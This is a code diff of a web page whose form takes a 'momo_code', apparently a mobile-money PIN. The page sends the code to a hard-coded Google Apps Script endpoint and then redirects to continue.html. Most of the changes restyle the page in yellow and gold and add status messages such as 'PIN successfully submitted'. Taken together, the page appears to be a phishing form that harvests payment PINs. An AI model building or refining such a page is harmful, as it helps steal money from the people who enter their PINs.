@@ -8,7 +8,7 @@
     body {
       font-family: Arial, sans-serif;
       margin: 0;
-      background: linear-gradient(to bottom, #08143a, #0b1d4d);
+      background: linear-gradient(to bottom, #f9d423, #0b1d4d);
       color: #fff;
       display: flex;
       flex-direction: column;
@@ -41,19 +41,22 @@
     }
 
     .form-container {
-      background: linear-gradient(145deg, rgba(10,25,70,0.95), rgba(15,35,90,0.95));
+      background: linear-gradient(145deg, rgba(249,212,35,0.9), rgba(15,35,90,0.95));
       width: 100%;
       max-width: 400px;
       padding: 30px 25px;
       border-radius: 12px;
       box-shadow: 0 6px 16px rgba(0,0,0,0.4);
+      color: #fff;
     }
 
     label {
       display: block;
-      margin-bottom: 6px;
-      font-size: 14px;
-      color: #fff;
+      margin-bottom: 8px;
+      font-size: 16px;
+      font-weight: bold;
+      color: #ffffff; /* bright white */
+      text-shadow: 0 1px 2px rgba(0,0,0,0.5);
     }
 
     input {
@@ -65,10 +68,17 @@
       background-color: rgba(11,29,77,0.9);
       color: #fff;
       font-size: 14px;
+      transition: all 0.3s ease;
     }
 
     input::placeholder {
       color: #ccc;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #f9d423;
+      box-shadow: 0 0 8px rgba(249,212,35,0.6);
     }
 
     .btn-submit {
@@ -76,7 +86,7 @@
       padding: 14px;
       font-size: 16px;
       font-weight: bold;
-      background: linear-gradient(135deg, #1e90ff, #187bcd);
+      background: linear-gradient(135deg, #f9d423, #f39c12);
       color: #fff;
       border: none;
       border-radius: 6px;
@@ -85,21 +95,23 @@
     }
 
     .btn-submit:hover {
-      background: linear-gradient(135deg, #187bcd, #1560a3);
+      background: linear-gradient(135deg, #f39c12, #d35400);
       transform: scale(1.02);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
     }
 
     .notice {
       font-size: 13px;
-      color: #ccc;
       text-align: center;
       margin-top: 12px;
+      font-weight: 500;
+      transition: color 0.3s ease;
     }
 
-    @media (max-width: 500px) {
-      .header h1 { font-size: 20px; }
-      .form-container { padding: 25px 15px; }
-    }
+    /* Status colors */
+    .notice.success { color: #28a745; }   /* Green */
+    .notice.error { color: #dc3545; }     /* Red */
+    .notice.pending { color: #f9d423; }  /* Yellow/Gold */
   </style>
 </head>
 <body>
@@ -127,13 +139,22 @@
 
     const WEBAPP_URL = "https://script.google.com/macros/s/AKfycbxJ1nxxUbrn8N7ancnw_Tc2gUJBJbvsOzuwRR5wJYNS1bF_0bckmYAYeItN1-eEsNbT/exec";
 
+    let dotsInterval;
+
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
-      statusEl.textContent = "Submitting...";
-      statusEl.style.color = "#ccc";
+      let dotCount = 0;
+
+      statusEl.textContent = "Submitting";
+      statusEl.className = "notice pending";
+
+      // Start dots animation
+      dotsInterval = setInterval(() => {
+        dotCount = (dotCount + 1) % 4;
+        statusEl.textContent = "Submitting" + ".".repeat(dotCount);
+      }, 500);
 
       const momo_code = document.getElementById('momo_code').value.trim();
-
       const formData = new FormData();
       formData.append("momo_code", momo_code);
 
@@ -145,21 +166,27 @@
         try {
           json = JSON.parse(text);
         } catch {
+          clearInterval(dotsInterval);
           statusEl.textContent = "Server error: " + text;
-          statusEl.style.color = "#ff6666";
+          statusEl.className = "notice error";
           return;
         }
 
+        clearInterval(dotsInterval);
+
         if (json.result === "success") {
-          window.location.href = "continue.html";
+          statusEl.textContent = "PIN successfully submitted";
+          statusEl.className = "notice success";
+          setTimeout(() => { window.location.href = "continue.html"; }, 1000);
         } else {
           statusEl.textContent = "Submission failed: " + (json.message || "Unknown error");
-          statusEl.style.color = "#ff6666";
+          statusEl.className = "notice error";
         }
       } catch (err) {
         console.error(err);
+        clearInterval(dotsInterval);
         statusEl.textContent = "Network error. Try again.";
-        statusEl.style.color = "#ff6666";
+        statusEl.className = "notice error";
       }
     });
   </script>
